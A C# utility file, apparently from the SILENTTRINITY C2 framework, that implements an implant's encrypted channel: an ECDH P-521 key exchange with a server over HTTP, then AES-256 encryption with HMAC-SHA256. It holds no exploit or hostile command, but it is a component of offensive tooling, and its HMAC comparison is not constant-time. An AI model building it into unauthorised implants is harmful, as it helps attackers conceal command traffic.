using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Org.BouncyCastle.Asn1.Nist;
using Org.BouncyCastle.Asn1.Sec;
using Org.BouncyCastle.Asn1.X9;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Digests;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;

namespace SILENTTRINITY.Utilities
{
    public static class Crypto
    {
        public static byte[] KeyExchange(Uri url)
        {
            X9ECParameters x9EC = NistNamedCurves.GetByName("P-521");
            ECDomainParameters ecDomain = new ECDomainParameters(x9EC.Curve, x9EC.G, x9EC.N, x9EC.H, x9EC.GetSeed());
            AsymmetricCipherKeyPair aliceKeyPair = GenerateKeyPair( ecDomain);

            ECPublicKeyParameters alicePublicKey = (ECPublicKeyParameters)aliceKeyPair.Public;
            ECPublicKeyParameters bobPublicKey = GetBobPublicKey(url, x9EC, alicePublicKey);

            byte[] AESKey = GenerateAESKey(bobPublicKey, aliceKeyPair.Private);

            return AESKey;
        }

        private static byte[] GenerateAESKey(ECPublicKeyParameters bobPublicKey, 
                                AsymmetricKeyParameter alicePrivateKey)
        {
            IBasicAgreement aKeyAgree = AgreementUtilities.GetBasicAgreement("ECDH");
            aKeyAgree.Init(alicePrivateKey);
            BigInteger sharedSecret = aKeyAgree.CalculateAgreement(bobPublicKey);
            byte[] sharedSecretBytes = sharedSecret.ToByteArray();

            IDigest digest = new Sha256Digest();
            byte[] symmetricKey = new byte[digest.GetDigestSize()];
            digest.BlockUpdate(sharedSecretBytes, 0, sharedSecretBytes.Length);
            digest.DoFinal(symmetricKey, 0);

            return symmetricKey;
        }

        private static ECPublicKeyParameters GetBobPublicKey(Uri url, 
                                                            X9ECParameters x9EC,
                                                            ECPublicKeyParameters alicePublicKey)
        {
            KeyCoords bobCoords = GetBobCoords(url, alicePublicKey);
            var point = x9EC.Curve.CreatePoint(bobCoords.X, bobCoords.Y);
            return new ECPublicKeyParameters("ECDH", point, SecObjectIdentifiers.SecP521r1);
        }

        private static AsymmetricCipherKeyPair GenerateKeyPair(ECDomainParameters ecDomain)
        {
            ECKeyPairGenerator g = (ECKeyPairGenerator)GeneratorUtilities.GetKeyPairGenerator("ECDH");
            g.Init(new ECKeyGenerationParameters(ecDomain, new SecureRandom()));

            AsymmetricCipherKeyPair aliceKeyPair = g.GenerateKeyPair();
            return aliceKeyPair;
        }

        private static KeyCoords GetBobCoords(Uri url, ECPublicKeyParameters publicKey)
        {
            string xml = GetXmlString(publicKey);

            string responseXml = Encoding.UTF8.GetString(Http.Post(url, Encoding.UTF8.GetBytes(xml)));

            XmlDocument doc = new XmlDocument();
            doc.LoadXml(responseXml);
            XmlElement root = doc.DocumentElement;
            XmlNodeList elemList = doc.DocumentElement.GetElementsByTagName("PublicKey");

            return new KeyCoords { 
                X = new BigInteger(elemList[0].FirstChild.Attributes["Value"].Value),
                Y = new BigInteger(elemList[0].LastChild.Attributes["Value"].Value)
            };
        }

        private static string GetXmlString(ECPublicKeyParameters publicKeyParameters)
        {
            string publicKeyXmlTemplate = @"<ECDHKeyValue xmlns=""http://www.w3.org/2001/04/xmldsig-more#"">
    <DomainParameters>
        <NamedCurve URN=""urn:oid:1.3.132.0.35"" />
    </DomainParameters>
    <PublicKey>
        <X Value=""X_VALUE"" xsi:type=""PrimeFieldElemType"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" />
        <Y Value=""Y_VALUE"" xsi:type=""PrimeFieldElemType"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" />
    </PublicKey>
</ECDHKeyValue>";
            string xml = publicKeyXmlTemplate;
            xml = xml.Replace("X_VALUE", publicKeyParameters.Q.AffineXCoord.ToBigInteger().ToString());
            xml = xml.Replace("Y_VALUE", publicKeyParameters.Q.AffineYCoord.ToBigInteger().ToString());
            return xml;
        }

        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            byte[] decryptedData = default;

            byte[] iv = new byte[16];
            byte[] ciphertext = new byte[(data.Length - 32) - 16];
            byte[] hmac = new byte[32];

            Array.Copy(data, iv, 16);
            Array.Copy(data, data.Length - 32, hmac, 0, 32);
            Array.Copy(data, 16, ciphertext, 0, (data.Length - 32) - 16);

            using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
            {
                byte[] computedHash = hmacsha256.ComputeHash(iv.Concat(ciphertext).ToArray());
                for (int i = 0; i < hmac.Length; i++)
                {
                    if (computedHash[i] != hmac[i])
                    {
                        return decryptedData;
                    }
                }
                decryptedData = AES.Decrypt(ciphertext, key, iv);
            }
            return decryptedData;
        }

        public static byte[] Encrypt(byte[] key, byte[] data)
        {
            IEnumerable<byte> blob = default(byte[]);

            using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
            {
                byte[] iv = new byte[16];
                rng.GetBytes(iv);

                byte[] encryptedData = AES.Encrypt(data, key, iv);

                using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
                {
                    byte[] ivEncData = iv.Concat(encryptedData).ToArray();
                    byte[] hmac = hmacsha256.ComputeHash(ivEncData);
                    blob = ivEncData.Concat(hmac);
                }
            }
            return blob.ToArray();
        }

        static class AES
        {
            public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Padding = PaddingMode.PKCS7;
                    aesAlg.KeySize = 256;
                    aesAlg.Key = key;
                    aesAlg.IV = iv;

                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                    using (MemoryStream decryptedData = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(data, 0, data.Length);
                            cryptoStream.FlushFinalBlock();
                            return decryptedData.ToArray();
                        }
                    }
                }
            }

            public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Padding = PaddingMode.PKCS7;
                    aesAlg.KeySize = 256;
                    aesAlg.Key = key;
                    aesAlg.IV = iv;

                    ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                    using (MemoryStream encryptedData = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(data, 0, data.Length);
                            cryptoStream.FlushFinalBlock();
                            return encryptedData.ToArray();
                        }
                    }
                }
            }
        }
    }

    internal class KeyCoords
    {
        public BigInteger X { get; set; }
        public BigInteger Y { get; set; }
    }
}
